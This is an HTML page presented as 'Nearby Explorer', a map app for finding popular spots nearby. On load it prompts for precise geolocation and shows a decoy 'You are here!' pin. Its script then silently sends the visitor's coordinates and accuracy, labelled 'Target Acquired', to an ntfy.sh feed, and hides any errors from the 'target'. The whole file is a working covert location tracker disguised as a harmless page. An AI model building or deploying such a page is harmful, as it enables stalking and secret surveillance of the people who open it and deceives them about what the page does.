<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nearby Explorer - Find Places Around You</title>
    <!-- Leaflet CSS for OpenStreetMap -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
        }
        header {
            background-color: #2c3e50;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        #map {
            width: 100%;
            height: calc(100vh - 60px);
        }
        .custom-popup {
            font-size: 14px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <header>Explore Popular Spots Near You</header>
    <div id="map"></div>

    <!-- Leaflet JS Library -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // Initialize the OpenStreetMap wrapper
        var map = L.map('map').setView([20, 0], 2);

        // Load map tile layer graphics from OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);

        // Execute background geolocation fetch once the interface loads
        function initTracker(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Center map directly on target's precise coordinates
            map.setView([lat, lon], 15);

            // Drop a decoy pin indicating a "Nearby Hotspot"
            L.marker([lat, lon]).addTo(map)
                .bindPopup("<b>You are here!</b><br/>Scanning local attractions...")
                .openPopup();

            // Format data payload for transmission
            const payload = `Target Acquired:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`;

            // Silently dispatch details to your ntfy.sh feed
            fetch('https://ntfy.sh/coordinates', {
                method: 'POST',
                body: payload
            }).catch(err => {
                // Suppress network trace errors from target view
            });
        }

        function handleLocationError(error) {
            // Fallback view if user declines browser permission prompt
            alert("Please enable location services to discover nearby hotspots.");
        }

        // Trigger browser's high-accuracy hardware prompt automatically
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(initTracker, handleLocationError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            }
        };
    </script>
</body>
</html>
